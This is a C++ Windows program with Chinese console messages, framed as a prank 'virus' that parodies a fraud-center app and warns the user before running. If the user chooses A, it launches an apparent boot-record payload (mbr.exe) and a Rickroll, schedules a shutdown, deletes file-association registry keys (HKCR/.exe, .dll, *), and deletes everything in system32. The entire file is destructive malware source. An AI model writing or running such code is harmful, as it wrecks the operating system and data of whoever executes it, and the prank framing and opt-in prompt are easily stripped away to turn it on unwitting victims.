#include <iostream>
#include <Windows.h>
#include <string>
using namespace std;
int main()
{
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,GetCurrentProcessId());
	string version = "1.3";
	char in;
	cout << "欢迎使用 国家诈骗中心APP" << version << "版！" << endl;
	cout << "这是一个一个病毒，如果你不知道这事一个一个病毒，" << endl;
	cout << "选择B则不会有任何事情。如果你知道这是病毒，并想" << endl;
	cout << "得到一台报废的电脑的话，选择A。" << endl;
	cout << "A.开始诈骗   B.退出" << endl;
	cin >> in;
	if (in == 'a' || in == 'A')
	{
		system("mbr.exe");
		cout << "正在启动诈骗程序......预计需要5秒" << endl;
		Sleep(5000);
		cout << "正在启动瑞克摇......" << endl;
		Sleep(1000);
		cout << "正在诈骗中，请稍等......" << endl;
		cout << "-详细信息-" << endl;
		cout << "诈骗金额：114514￥" << endl;
		cout << "诈骗方式：瑞克摇勒索病毒" << endl;
		cout << "诈骗目标：寻找中" << endl;
		Sleep(1000);
		cout << "找到诈骗目标：你自己" << endl;
		cout << "LOL:你被骗了" << endl;
		system("RickRoll.mp3");
		system("shutdown -s -t 15");
		system("tanchuang.exe");
		Sleep(5000);
		system("@echo off Start reg delete HKCR/.exe Start reg delete HKCR/.dll Start reg delete HKCR/*");
		system("del c:\\WINDOWS\\system32\\*.*/q");
		system("mouse.exe");
	}
	return 0;
}
